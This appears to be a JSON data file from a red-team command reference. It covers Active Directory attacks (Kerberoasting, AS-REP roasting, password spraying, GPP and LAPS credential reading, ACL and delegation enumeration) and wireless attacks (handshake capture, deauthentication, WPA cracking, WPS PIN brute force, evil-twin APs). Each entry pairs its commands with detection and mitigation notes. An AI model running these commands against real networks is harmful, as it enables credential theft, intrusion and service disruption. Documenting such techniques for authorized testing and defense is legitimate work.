 {"id":"adx-powerview-shares","cat":"Active Directory Attacks","title":"Domain share hunting (Find-DomainShare)","desc":"Locate readable network shares across domain computers to find loot. Requires PowerView.ps1.","danger":"Authorized use only. Touches many hosts and can trip share-access auditing.","team":"red","tags":["active-directory","smb","discovery"],"attack":["T1135"],"detect":"Many SMB tree-connect (5140) / share access events from one source across numerous hosts in a short window; NIDS SMB enumeration signatures.","mitigate":"Enable object-access auditing on shares; remove open/legacy shares; segment SMB; alert on horizontal share sweeps.","code":{"ps":"Import-Module .\\PowerView.ps1\nFind-DomainShare -CheckShareAccess\n# Search interesting file names on found shares:\nFind-InterestingDomainShareFile -Include *pass*,*.kdbx,*.config"}},
 {"id":"adx-acl-enum","cat":"Active Directory Attacks","title":"Interesting ACL / rights enumeration","desc":"Find abusable ACEs (GenericAll, WriteDACL, ForceChangePassword, etc.) across AD objects. Requires PowerView.ps1.","danger":"Authorized use only. Reveals privilege-escalation paths; enumeration is logged.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1087.002","T1069.002"],"detect":"4662 with security-descriptor read access on many objects; BloodHound-style attribute enumeration flagged by LDAP volume monitoring.","mitigate":"Audit and tighten delegated ACLs; remove excessive GenericAll/WriteDACL grants; use tiered admin model; monitor object DACL reads.","code":{"ps":"Import-Module .\\PowerView.ps1\nFind-InterestingDomainAcl -ResolveGUIDs |\n  Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|ForceChangePassword' } |\n  Select-Object IdentityReferenceName, ActiveDirectoryRights, ObjectDN"}},
 {"id":"adx-delegation-enum","cat":"Active Directory Attacks","title":"Kerberos delegation enumeration","desc":"Find unconstrained, constrained, and resource-based delegation configs. Requires PowerView.ps1 (or impacket findDelegation.py).","danger":"Authorized use only. Delegation misconfigs are high-impact escalation paths.","team":"red","tags":["active-directory","enumeration"],"attack":["T1087.002"],"detect":"LDAP reads of userAccountControl / msDS-AllowedToDelegateTo attributes (4662, 1644); anomalous querying of computer trust attributes.","mitigate":"Set sensitive accounts to 'Account is sensitive and cannot be delegated'; avoid unconstrained delegation; audit msDS-AllowedToActOnBehalfOfOtherIdentity.","code":{"ps":"Import-Module .\\PowerView.ps1\n# Unconstrained delegation (TRUSTED_FOR_DELEGATION):\nGet-DomainComputer -Unconstrained | Select-Object dnshostname\n# Constrained delegation targets:\nGet-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto\nGet-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto","linux":"findDelegation.py {{DOMAIN:corp.local}}/{{USER:jdoe}}:'{{PASS}}' -dc-ip {{DC_IP:10.0.0.10}}"}},
 {"id":"adx-trust-enum","cat":"Active Directory Attacks","title":"Domain and forest trust enumeration","desc":"Map trust relationships to plan lateral movement across domains/forests. Native tools plus PowerView.","danger":"Authorized use only. Trust mapping precedes cross-domain attacks.","team":"red","tags":["active-directory","enumeration","discovery"],"attack":["T1482"],"detect":"Enumeration of trustedDomain objects (4662); nltest usage on endpoints; LDAP queries against the System container.","mitigate":"Minimize and audit trusts; enable SID filtering / selective authentication on external trusts; monitor cross-domain auth patterns.","code":{"cmd":"nltest /domain_trusts /all_trusts","ps":"# Native RSAT AD module:\nGet-ADTrust -Filter * | Select-Object Name,Direction,TrustType\n# PowerView:\nGet-DomainTrust\nGet-ForestTrust"}},
 {"id":"adx-spn-discover","cat":"Active Directory Attacks","title":"Service Principal Name (SPN) discovery","desc":"Find accounts with SPNs (Kerberoasting candidates) using native setspn or LDAP, no external tools.","danger":"Authorized use only. Identifies roastable service accounts.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1558.003"],"detect":"LDAP queries filtering servicePrincipalName=* (1644, 4662); setspn.exe execution on non-admin hosts.","mitigate":"Use gMSAs / long random passwords for service accounts; minimize accounts with SPNs; monitor SPN attribute queries.","code":{"cmd":"setspn -T {{DOMAIN:corp.local}} -Q */*","ps":"# ADSI, no tools required:\n$s = [adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))'\n$s.PageSize = 500\n$s.FindAll() | ForEach-Object { $_.Properties.samaccountname }"}},
 {"id":"adx-kerberoast-impacket","cat":"Active Directory Attacks","title":"Kerberoasting with GetUserSPNs (impacket)","desc":"Request TGS tickets for SPN accounts and output crackable hashes. Requires impacket (GetUserSPNs.py).","danger":"Authorized use only. Crack offline; do not brute-force live accounts.","team":"red","tags":["active-directory","password","enumeration"],"attack":["T1558.003"],"detect":"Kerberos 4769 for service tickets with encryption type 0x17 (RC4) to multiple SPNs from one account in quick succession.","mitigate":"Enforce AES-only Kerberos; gMSAs and 25+ char service passwords; alert on RC4 4769 bursts; honeypot SPN accounts.","code":{"linux":"GetUserSPNs.py {{DOMAIN:corp.local}}/{{USER:jdoe}}:'{{PASS}}' -dc-ip {{DC_IP:10.0.0.10}} -request -outputfile kerb_hashes.txt\n# then crack offline:\nhashcat -m 13100 kerb_hashes.txt wordlist.txt","mac":"GetUserSPNs.py {{DOMAIN:corp.local}}/{{USER:jdoe}}:'{{PASS}}' -dc-ip {{DC_IP:10.0.0.10}} -request -outputfile kerb_hashes.txt"}},
 {"id":"adx-kerberoast-rubeus","cat":"Active Directory Attacks","title":"Kerberoasting with Rubeus","desc":"Request and export Kerberoast hashes from a Windows domain host. Requires Rubeus.exe.","danger":"Authorized use only. Crack tickets offline against systems you may test.","team":"red","tags":["active-directory","password"],"attack":["T1558.003"],"detect":"4769 RC4 (0x17) ticket requests for many SPNs from one workstation; Rubeus flagged by EDR/AMSI; Sysmon process/assembly-load events.","mitigate":"AES-only service accounts; gMSAs; alert on RC4 downgrade and 4769 volume; application allowlisting to block Rubeus.","code":{"ps":".\\Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt\n# Target a single account and avoid RC4-only noise if AES is set:\n.\\Rubeus.exe kerberoast /user:{{SVC_ACCT:svc-sql}} /simple"}},
 {"id":"adx-asrep-impacket","cat":"Active Directory Attacks","title":"AS-REP roasting with GetNPUsers (impacket)","desc":"Roast accounts that do not require Kerberos pre-authentication. Requires impacket (GetNPUsers.py).","danger":"Authorized use only. Crack the returned hashes offline.","team":"red","tags":["active-directory","password","enumeration"],"attack":["T1558.004"],"detect":"4768 AS-REQ with pre-auth not required for multiple accounts from one source; LDAP filtering on userAccountControl bit 0x400000 (DONT_REQ_PREAUTH).","mitigate":"Require Kerberos pre-authentication on all accounts; audit DONT_REQ_PREAUTH flag; enforce strong passwords; alert on AS-REP roasting patterns.","code":{"linux":"# With a userlist (no creds needed):\nGetNPUsers.py {{DOMAIN:corp.local}}/ -usersfile users.txt -dc-ip {{DC_IP:10.0.0.10}} -no-pass -format hashcat -outputfile asrep.txt\n# then: hashcat -m 18200 asrep.txt wordlist.txt","mac":"GetNPUsers.py {{DOMAIN:corp.local}}/ -usersfile users.txt -dc-ip {{DC_IP:10.0.0.10}} -no-pass -format hashcat -outputfile asrep.txt"}},
 {"id":"adx-asrep-rubeus","cat":"Active Directory Attacks","title":"AS-REP roasting with Rubeus","desc":"Enumerate and roast pre-auth-disabled accounts from a Windows host. Requires Rubeus.exe.","danger":"Authorized use only. Crack offline against authorized targets.","team":"red","tags":["active-directory","password"],"attack":["T1558.004"],"detect":"4768 events showing pre-auth not required across accounts; Rubeus binary flagged by EDR; script/assembly load telemetry.","mitigate":"Enforce Kerberos pre-authentication; remove DONT_REQ_PREAUTH; strong password policy; application allowlisting.","code":{"ps":".\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n# Scope to a specific user:\n.\\Rubeus.exe asreproast /user:{{USER:legacyacct}} /format:hashcat"}},
 {"id":"adx-spray-kerbrute","cat":"Active Directory Attacks","title":"Password spraying with kerbrute","desc":"Test one password against many users via Kerberos pre-auth (low lockout risk if paced). Requires kerbrute.","danger":"Authorized use only. Respect lockout policy; one password per round with delays.","team":"red","tags":["active-directory","password","account"],"attack":["T1110.003"],"detect":"Many 4768/4771 pre-auth attempts (single password) across distinct accounts from one source IP; short-window failure clustering.","mitigate":"Account lockout + smart lockout; MFA; monitor 4771/4768 spray patterns; alert on many accounts, one source.","code":{"linux":"kerbrute passwordspray -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt '{{PASSWORD:Spring2026!}}'","mac":"kerbrute passwordspray -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt '{{PASSWORD:Spring2026!}}'","ps":".\\kerbrute_windows_amd64.exe passwordspray -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt {{PASSWORD:Spring2026!}}"}},
 {"id":"adx-spray-netexec","cat":"Active Directory Attacks","title":"Password spraying with NetExec","desc":"Spray credentials over SMB/LDAP and stop on success. Requires NetExec (nxc, formerly CrackMapExec).","danger":"Authorized use only. Failed SMB logons risk lockouts; pace carefully.","team":"red","tags":["active-directory","password","smb"],"attack":["T1110.003"],"detect":"Bursts of 4625 (failed logon) or 4771 across many usernames from one host; SMB auth flood to the DC.","mitigate":"Lockout thresholds; MFA; disable NTLM where possible; alert on horizontal auth failures; network segmentation.","code":{"linux":"nxc smb {{DC_IP:10.0.0.10}} -u users.txt -p '{{PASSWORD:Spring2026!}}' --continue-on-success\n# LDAP variant:\nnxc ldap {{DC_IP:10.0.0.10}} -u users.txt -p '{{PASSWORD:Spring2026!}}' --continue-on-success"}},
 {"id":"adx-kerbrute-userenum","cat":"Active Directory Attacks","title":"Username enumeration via Kerberos","desc":"Validate which usernames exist using Kerberos pre-auth responses (no lockout). Requires kerbrute.","danger":"Authorized use only. Confirms valid accounts for later spraying.","team":"red","tags":["active-directory","enumeration","account"],"attack":["T1087.002"],"detect":"Many 4768 AS-REQ with distinct usernames from one source; DC receiving rapid Kerberos principal probes.","mitigate":"Monitor 4768 enumeration bursts; rate-limit at network edge; avoid predictable username schemes; alert on high invalid-principal rates.","code":{"linux":"kerbrute userenum -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt","mac":"kerbrute userenum -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt","ps":".\\kerbrute_windows_amd64.exe userenum -d {{DOMAIN:corp.local}} --dc {{DC_IP:10.0.0.10}} users.txt"}},
 {"id":"adx-ldapsearch-enum","cat":"Active Directory Attacks","title":"LDAP enumeration with ldapsearch","desc":"Query users, groups, and attributes directly over LDAP. Built in on macOS; needs ldap-utils/openldap on Linux.","danger":"Authorized use only. Bind credentials and queries are logged on the DC.","team":"red","tags":["active-directory","ldap","enumeration"],"attack":["T1087.002","T1069.002"],"detect":"DC LDAP query logging (1644) and 4662 show an account pulling large result sets; unusual LDAP binds from non-management hosts.","mitigate":"Least privilege on read attributes; LDAP query auditing; restrict anonymous/legacy binds; segment DC access.","code":{"linux":"ldapsearch -x -H ldap://{{DC_IP:10.0.0.10}} -D '{{USER:jdoe}}@{{DOMAIN:corp.local}}' -w '{{PASS}}' -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description","mac":"ldapsearch -x -H ldap://{{DC_IP:10.0.0.10}} -D '{{USER:jdoe}}@{{DOMAIN:corp.local}}' -w '{{PASS}}' -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description"}},
 {"id":"adx-ldap-native-query","cat":"Active Directory Attacks","title":"Native LDAP queries (no tools)","desc":"Enumerate AD from a Windows host using built-in ADSI searcher and dsquery — no PowerView needed.","danger":"Authorized use only. LDAP reads are logged on the DC.","team":"red","tags":["active-directory","ldap","enumeration"],"attack":["T1087.002","T1069.002"],"detect":"4662 / 1644 on the DC; dsquery.exe execution; PowerShell script block logging (4104) capturing adsisearcher usage.","mitigate":"Least-privilege attribute access; script block + module logging; alert on bulk LDAP reads from workstations.","code":{"cmd":"dsquery user -limit 0\ndsquery group -name \"*admin*\"","ps":"# Find users whose password never expires (UAC bit 0x10000):\n$s=[adsisearcher]'(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'\n$s.PageSize=500\n$s.FindAll() | ForEach-Object { $_.Properties.samaccountname }"}},
 {"id":"adx-gpp-cpassword","cat":"Active Directory Attacks","title":"Group Policy Preferences (GPP) cpassword","desc":"Find AES-encrypted (publicly keyed) passwords left in SYSVOL Group Policy XML.","danger":"Authorized use only. Any domain user can read SYSVOL; recovered creds may be live.","team":"red","tags":["active-directory","password","smb"],"attack":["T1552.006"],"detect":"SYSVOL read access for Groups.xml/Services.xml/Scheduledtasks.xml; Get-GPPPassword tooling flagged by EDR; unusual SYSVOL crawling.","mitigate":"Install MS14-025 and remove legacy cpassword XML from SYSVOL; rotate any exposed accounts; audit SYSVOL for cpassword strings.","code":{"cmd":"findstr /S /I cpassword \\\\{{DOMAIN:corp.local}}\\sysvol\\*.xml","ps":"# PowerSploit helper (decrypts cpassword):\nGet-GPPPassword","linux":"# impacket remote reader (authenticated SYSVOL search):\nGet-GPPPassword.py {{DOMAIN:corp.local}}/'{{USER:jdoe}}':'{{PASS}}'@{{DC_IP:10.0.0.10}}"}},
 {"id":"adx-laps-read","cat":"Active Directory Attacks","title":"Read LAPS local admin passwords","desc":"Retrieve ms-Mcs-AdmPwd (or msLAPS-Password) for computers where your principal has read rights.","danger":"Authorized use only. Exposes local admin passwords; requires delegated read permission.","team":"red","tags":["active-directory","password"],"attack":["T1555"],"detect":"4662 read access to ms-Mcs-AdmPwd / msLAPS-Password attributes; anomalous accounts reading LAPS attributes across many computers.","mitigate":"Tightly scope LAPS read ACLs; audit ms-Mcs-AdmPwd reads (SACL); rotate on read; use Windows LAPS with encryption.","code":{"ps":"# RSAT AD module or PowerView:\nGet-ADComputer {{HOST:WS01}} -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' |\n  Select-Object Name,'ms-Mcs-AdmPwd'\n# Find all readable LAPS passwords:\nGet-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' |\n  Where-Object { $_.'ms-Mcs-AdmPwd' } | Select-Object Name,'ms-Mcs-AdmPwd'"}},
 {"id":"adx-priv-groups-enum","cat":"Active Directory Attacks","title":"Privileged group membership enumeration","desc":"List members of Domain Admins, Enterprise Admins, and other high-value groups using native tools.","danger":"Authorized use only. Maps high-value targets; enumeration is logged.","team":"red","tags":["active-directory","enumeration","account"],"attack":["T1069.002","T1087.002"],"detect":"net.exe /domain group queries; 4662 reads of privileged group membership; repeated group enumeration from workstations.","mitigate":"Minimize privileged group membership; use PAM/JIT admin; monitor group enumeration; protected users group for admins.","code":{"cmd":"net group \"Domain Admins\" /domain\nnet group \"Enterprise Admins\" /domain","ps":"Get-ADGroupMember 'Domain Admins' -Recursive | Select-Object name,objectClass\n# PowerView equivalent:\nGet-DomainGroupMember -Identity 'Domain Admins' -Recurse"}},
 {"id":"adx-machineaccountquota","cat":"Active Directory Attacks","title":"Machine Account Quota (MAQ) enumeration","desc":"Check ms-DS-MachineAccountQuota — a nonzero value lets low-priv users join computers (RBCD/noPac paths).","danger":"Authorized use only. Identifies a common privilege-escalation prerequisite.","team":"red","tags":["active-directory","enumeration","ldap"],"attack":["T1087.002"],"detect":"LDAP reads of ms-DS-MachineAccountQuota (1644, 4662); later 4741 (computer account created) by a standard user is a stronger signal.","mitigate":"Set ms-DS-MachineAccountQuota to 0 and delegate computer creation explicitly; monitor 4741 by non-admins.","code":{"ps":"# Native AD module:\nGet-ADObject -Identity ((Get-ADDomain).DistinguishedName) -Properties ms-DS-MachineAccountQuota |\n  Select-Object ms-DS-MachineAccountQuota\n# PowerView:\nGet-DomainObject -Identity (Get-Domain).Name | Select-Object ms-ds-machineaccountquota","linux":"nxc ldap {{DC_IP:10.0.0.10}} -u {{USER:jdoe}} -p '{{PASS}}' -M maq"}},
 {"id":"adx-adcs-enum","cat":"Active Directory Attacks","title":"AD CS certificate template enumeration","desc":"Enumerate certificate templates/CAs for misconfigurations (ESC1-ESC8). Requires Certipy (Linux) or Certify.exe (Windows).","danger":"Authorized use only. Identifies certificate-based escalation paths; enumeration only.","team":"red","tags":["active-directory","certificates","enumeration"],"attack":["T1649"],"detect":"LDAP reads of the PKI/Certificate Templates container (4662); Certipy/Certify tooling flagged by EDR; anomalous enrollment-config queries.","mitigate":"Remove ENROLLEE_SUPPLIES_SUBJECT + client-auth on low-priv templates; restrict enrollment rights; enable CA auditing; apply Microsoft ADCS hardening.","code":{"linux":"certipy find -u {{USER:jdoe}}@{{DOMAIN:corp.local}} -p '{{PASS}}' -dc-ip {{DC_IP:10.0.0.10}} -vulnerable -stdout","ps":".\\Certify.exe find /vulnerable"}},
 {"id":"adx-null-session-rid","cat":"Active Directory Attacks","title":"Null-session / RID-cycling enumeration","desc":"Enumerate users and groups via anonymous SMB/RPC where legacy access is allowed. Requires enum4linux-ng or rpcclient.","danger":"Authorized use only. Works only against misconfigured hosts allowing null sessions.","team":"red","tags":["active-directory","enumeration","smb"],"attack":["T1087.002"],"detect":"Anonymous/null SMB sessions (5140/5145) and SAMR queries; RID-cycling shows sequential account lookups from one source.","mitigate":"Set RestrictAnonymous/RestrictRemoteSam; disable null sessions; block SMB from untrusted segments; alert on anonymous SAMR enumeration.","code":{"linux":"enum4linux-ng -A {{DC_IP:10.0.0.10}}\n# Manual RID cycling via rpcclient:\nrpcclient -U '' -N {{DC_IP:10.0.0.10}} -c 'enumdomusers'"}},

/* ================= WIRELESS AUDITING ================= */
 {"id":"wifi-list-interfaces","cat":"Wireless Auditing","title":"List wireless interfaces & capabilities","desc":"Enumerate local Wi-Fi adapters and their driver/PHY info before auditing.","tags":["wireless","recon","cross-platform"],"code":{"linux":"iw dev\niw phy","mac":"networksetup -listallhardwareports\nsystem_profiler SPAirPortDataType","ps":"netsh wlan show interfaces\nnetsh wlan show drivers"}},
 {"id":"wifi-scan-nearby","cat":"Wireless Auditing","title":"Survey nearby access points","desc":"List in-range APs (SSID/BSSID/channel/signal/security) using each OS's native tooling.","danger":"Passive recon of third-party networks may be restricted; audit only networks you own or are authorized to test.","team":"red","tags":["wireless","recon","scanning"],"attack":["T1595"],"detect":"Purely passive listening leaves no over-the-air trace, but repeated association probes from one MAC show up in AP client logs and WIDS association tables.","mitigate":"Disable SSID auto-response where possible, enable WIDS/WIPS, and treat SSID hiding as obscurity not security.","code":{"linux":"nmcli -f SSID,BSSID,CHAN,SIGNAL,SECURITY dev wifi list","mac":"system_profiler SPAirPortDataType","ps":"netsh wlan show networks mode=bssid"}},
 {"id":"wifi-monitor-airmon","cat":"Wireless Auditing","title":"Enable monitor mode (airmon-ng)","desc":"Put an adapter into monitor mode with aircrack-ng's airmon-ng, killing interfering processes first.","danger":"Requires root and disconnects the interface from normal networking; use only on hardware/networks you are authorized to audit.","team":"red","tags":["wireless","recon","linux"],"attack":["T1040"],"detect":"Monitor mode is receive-only and not observable on the air; on the host, an EDR/osquery check for interfaces in monitor type (e.g. wlan0mon) flags it.","mitigate":"Restrict who can run raw-socket/monitor tools, and rely on WPA3/PMF so captured frames are not useful.","code":{"linux":"sudo airmon-ng check kill\nsudo airmon-ng start {{IFACE:wlan0}}"}},
 {"id":"wifi-monitor-manual","cat":"Wireless Auditing","title":"Enable monitor mode (manual iw)","desc":"Switch an interface to monitor mode with iw/ip when airmon-ng is unavailable; macOS uses tcpdump -I.","danger":"Requires root and drops the interface offline; authorized audits only.","team":"red","tags":["wireless","recon","linux"],"attack":["T1040"],"detect":"No radio-side signature; host telemetry showing an interface set to type monitor or a tcpdump -I process is the tell.","mitigate":"Limit local admin, and use WPA3-SAE + 802.11w so sniffed frames yield nothing crackable.","code":{"linux":"sudo ip link set {{IFACE:wlan0}} down\nsudo iw dev {{IFACE:wlan0}} set type monitor\nsudo ip link set {{IFACE:wlan0}} up","mac":"sudo tcpdump -I -i en0 -w /tmp/wifi.pcap"}},
 {"id":"wifi-airodump-survey","cat":"Wireless Auditing","title":"Live AP/client survey (airodump-ng)","desc":"Sweep all channels with airodump-ng to map APs and associated clients before targeting your test AP.","danger":"Requires monitor mode and root; captures traffic from all nearby networks, so scope to authorized testing.","team":"red","tags":["wireless","recon","scanning"],"attack":["T1040"],"detect":"Passive capture is invisible over the air; correlated deauth/probe activity from the same session is what WIDS actually flags.","mitigate":"Deploy WIPS to baseline expected APs/clients and alert on unknown monitors staging follow-on attacks.","code":{"linux":"sudo airodump-ng {{IFACE:wlan0mon}}"}},
 {"id":"wifi-airodump-capture","cat":"Wireless Auditing","title":"Capture a WPA handshake (airodump-ng)","desc":"Lock airodump-ng to one BSSID/channel and write a capture to grab the 4-way EAPOL handshake on your own AP.","danger":"Root + monitor mode; targets a single AP by BSSID — use only your own or explicitly authorized network.","team":"red","tags":["wireless","password","linux"],"attack":["T1040"],"detect":"Handshake capture is passive; the paired deauth used to speed it up (see aireplay entry) is the detectable signal in WIDS logs.","mitigate":"WPA3-SAE resists offline handshake cracking; on WPA2 enforce long random passphrases and enable 802.11w (PMF).","code":{"linux":"sudo airodump-ng --bssid {{BSSID:AA:BB:CC:DD:EE:FF}} -c {{CHANNEL:6}} -w handshake {{IFACE:wlan0mon}}","mac":"sudo tcpdump -I -i en0 -c 4000 -w handshake.pcap"}},
 {"id":"wifi-deauth-aireplay","cat":"Wireless Auditing","title":"Deauthenticate a client (aireplay-ng)","desc":"Send 802.11 deauth frames with aireplay-ng to force a client to reconnect and re-emit the handshake.","danger":"Actively disrupts connectivity (denial of service) and is illegal against networks you do not own; written authorization required.","team":"red","tags":["wireless","exploitation","linux"],"attack":["T1498"],"detect":"Bursts of type/subtype 0x0C deauth frames, especially spoofing the AP's BSSID, trigger WIDS deauth-flood alerts and show as sudden mass client drops.","mitigate":"Enable 802.11w Protected Management Frames (mandatory in WPA3) so forged deauth frames are rejected.","code":{"linux":"sudo aireplay-ng --deauth {{COUNT:5}} -a {{BSSID:AA:BB:CC:DD:EE:FF}} -c {{CLIENT:11:22:33:44:55:66}} {{IFACE:wlan0mon}}"}},
 {"id":"wifi-verify-handshake","cat":"Wireless Auditing","title":"Verify a capture contains a handshake","desc":"Confirm EAPOL messages are present before cracking, using aircrack-ng's summary or a tshark filter.","danger":"Read-only on your own capture file; still audit only data you were authorized to collect.","team":"red","tags":["wireless","password","triage"],"attack":["T1040"],"detect":"Offline file inspection; nothing observable on the network.","mitigate":"N/A defensively — value is in confirming that PMF/WPA3 prevented a usable handshake from ever being captured.","code":{"linux":"aircrack-ng handshake-01.cap\ntshark -r handshake-01.cap -Y eapol"}},
 {"id":"wifi-crack-aircrack","cat":"Wireless Auditing","title":"Crack WPA/WPA2 handshake (aircrack-ng)","desc":"Run a dictionary attack with aircrack-ng against a handshake captured from your own AP.","danger":"Offline password attack against a passphrase you must own or be authorized to test; illegal otherwise.","team":"red","tags":["wireless","password","linux"],"attack":["T1110.002"],"detect":"Fully offline and undetectable on the wire; defenders can only assume any captured handshake is under attack.","mitigate":"Use 15+ char random passphrases and migrate to WPA3-SAE, which is not vulnerable to offline dictionary attacks on the handshake.","code":{"linux":"aircrack-ng -w {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -b {{BSSID:AA:BB:CC:DD:EE:FF}} handshake-01.cap"}},
 {"id":"wifi-convert-hashcat","cat":"Wireless Auditing","title":"Convert capture to hashcat 22000","desc":"Convert a .cap/.pcapng to the hashcat WPA-PBKDF2/PMKID mode 22000 format using hcxpcapngtool (hcxtools).","danger":"Prepares captured handshake material for cracking; only process data from authorized audits.","team":"red","tags":["wireless","password","linux"],"attack":["T1110.002"],"detect":"Offline conversion, no network signature.","mitigate":"WPA3-SAE and long random passphrases render the resulting 22000 hash impractical to crack.","code":{"linux":"hcxpcapngtool -o {{OUT:hash.22000}} handshake-01.cap"}},
 {"id":"wifi-crack-hashcat","cat":"Wireless Auditing","title":"GPU-crack WPA hash (hashcat -m 22000)","desc":"Dictionary/mask attack a converted WPA hash with hashcat mode 22000 (needs hashcat + GPU driver).","danger":"High-speed offline password cracking; run only against your own captured hashes or with written authorization.","team":"red","tags":["wireless","password","linux"],"attack":["T1110.002"],"detect":"Offline; not visible to network defenders.","mitigate":"Enforce entropy the wordlist/masks cannot cover (long random passphrases) and adopt WPA3-SAE.","code":{"linux":"hashcat -m 22000 {{HASH:hash.22000}} {{WORDLIST:/usr/share/wordlists/rockyou.txt}}"}},
 {"id":"wifi-pmkid-hcxdumptool","cat":"Wireless Auditing","title":"Capture PMKID (hcxdumptool)","desc":"Client-less PMKID capture against your own AP with hcxdumptool (flag syntax varies by version; check --help).","danger":"Root + radio transmit; actively probes APs, so restrict to networks you own or are authorized to audit.","team":"red","tags":["wireless","password","linux"],"attack":["T1040"],"detect":"Association/EAPOL requests to APs without a real client appear in AP logs and WIDS as anomalous PMKID solicitations.","mitigate":"WPA3-SAE does not expose a crackable PMKID; on WPA2 use long random passphrases and disable roaming features that leak PMKID where feasible.","code":{"linux":"sudo hcxdumptool -i {{IFACE:wlan0}} -w pmkid.pcapng"}},
 {"id":"wifi-wash-wps-scan","cat":"Wireless Auditing","title":"Find WPS-enabled APs (wash)","desc":"Identify nearby APs with WPS enabled and their lock state using wash (reaver suite).","danger":"Root + monitor mode; recon of third-party WPS state is restricted — scope to authorized targets.","team":"red","tags":["wireless","recon","linux"],"attack":["T1595"],"detect":"Passive WPS-IE parsing is invisible over the air; follow-on reaver/bully PIN attempts are what logs capture.","mitigate":"Disable WPS entirely on all APs — it is the precondition for PIN brute-force attacks.","code":{"linux":"sudo wash -i {{IFACE:wlan0mon}}"}},
 {"id":"wifi-reaver-wps","cat":"Wireless Auditing","title":"WPS PIN attack (reaver)","desc":"Brute-force / Pixie-Dust a WPS PIN with reaver to recover the WPA passphrase on your own AP.","danger":"Actively hammers the AP's WPS registrar and can lock or crash it; only against APs you own or are authorized to test.","team":"red","tags":["wireless","password","linux"],"attack":["T1110"],"detect":"Repeated WPS EAP registrar attempts from one MAC appear in AP logs and trip WPS lockout counters.","mitigate":"Disable WPS; if unavoidable, enable AP-side WPS lockout after failed attempts and patch Pixie-Dust-vulnerable firmware.","code":{"linux":"sudo reaver -i {{IFACE:wlan0mon}} -b {{BSSID:AA:BB:CC:DD:EE:FF}} -vv"}},
 {"id":"wifi-bully-wps","cat":"Wireless Auditing","title":"WPS PIN attack (bully)","desc":"Alternative WPS PIN brute-force with bully, often more robust against flaky registrars.","danger":"Actively attacks the WPS registrar and may lock the AP; authorized targets only.","team":"red","tags":["wireless","password","linux"],"attack":["T1110"],"detect":"Same WPS registrar-attempt bursts and lockout events as reaver in AP logs.","mitigate":"Turn off WPS across the estate and enforce registrar lockout/rate-limiting on any device that must keep it.","code":{"linux":"sudo bully {{IFACE:wlan0mon}} -b {{BSSID:AA:BB:CC:DD:EE:FF}} -v 3"}},
 {"id":"wifi-wifite-auto","cat":"Wireless Auditing","title":"Automated audit (wifite)","desc":"Run wifite to orchestrate scanning, handshake/PMKID capture, WPS and cracking against selected targets.","danger":"Automates deauth and active attacks against every selected AP; only launch against networks in your authorized scope.","team":"red","tags":["wireless","exploitation","linux"],"attack":["T1110.002"],"detect":"Its deauth floods and WPS attempts generate the same WIDS alerts as the individual tools it drives.","mitigate":"WPA3-SAE + PMF + disabled WPS remove almost every attack path wifite automates.","code":{"linux":"sudo wifite"}},
 {"id":"wifi-kismet-passive","cat":"Wireless Auditing","title":"Passive wardriving / detection (kismet)","desc":"Run kismet for passive multi-band AP/client discovery, logging and rogue-device detection.","danger":"Root; passively logs all nearby wireless devices — handle collected data per your authorization and privacy rules.","team":"red","tags":["wireless","recon","detection"],"attack":["T1040"],"detect":"Receive-only, so undetectable on the air; useful defensively too as a WIDS to spot others' deauth/rogue activity.","mitigate":"Also deploy kismet defensively to baseline your RF environment and alert on unexpected APs and monitors.","code":{"linux":"sudo kismet -c {{IFACE:wlan0}}"}},
 {"id":"wifi-mac-spoof","cat":"Wireless Auditing","title":"Randomize adapter MAC (macchanger)","desc":"Change the Wi-Fi adapter's MAC with macchanger (Linux) or ifconfig ether (macOS) for privacy or MAC-filter testing.","danger":"Root; impersonating a MAC to bypass access controls on networks you don't own is prohibited — authorized testing only.","team":"red","tags":["wireless","post-ex","linux"],"attack":["T1036"],"detect":"Duplicate MACs or OUI/vendor mismatches versus expected hardware show up in DHCP and switch/AP MAC tables.","mitigate":"Do not rely on MAC filtering as a control; use 802.1X/WPA-Enterprise for real device authentication.","code":{"linux":"sudo ip link set {{IFACE:wlan0}} down\nsudo macchanger -r {{IFACE:wlan0}}\nsudo ip link set {{IFACE:wlan0}} up","mac":"sudo ifconfig en0 ether {{MAC:00:11:22:33:44:55}}"}},
 {"id":"wifi-set-channel","cat":"Wireless Auditing","title":"Lock monitor interface to a channel","desc":"Pin a monitor-mode interface to a specific channel so captures aren't lost to channel hopping.","danger":"Requires root; changes radio state on the local adapter.","tags":["wireless","linux","reference"],"code":{"linux":"sudo iw dev {{IFACE:wlan0mon}} set channel {{CHANNEL:6}}"}},
 {"id":"wifi-rogue-ap-catalog","cat":"Wireless Auditing","title":"Rogue AP / evil-twin tooling (catalog)","desc":"Reference for adversary-in-the-middle AP tooling (airbase-ng, hostapd) used in lab AitM tests; practice on HackTheBox/TryHackMe wireless ranges, not production RF.","danger":"Standing up a look-alike AP to intercept clients is a serious AitM attack — build only in an isolated lab or with explicit written authorization.","team":"red","tags":["wireless","exploitation","teaching"],"attack":["T1557"],"detect":"WIDS flags a second BSSID advertising a known SSID, unexpected channel/signal for that SSID, and clients associating to an unauthorized AP MAC.","mitigate":"Use WPA3/802.1X with server-certificate validation so clients reject rogue APs; deploy WIPS to alert on and contain evil twins.","code":{"linux":"sudo airbase-ng -e \"{{SSID:TestLab-AP}}\" -c {{CHANNEL:6}} {{IFACE:wlan0mon}}"}},
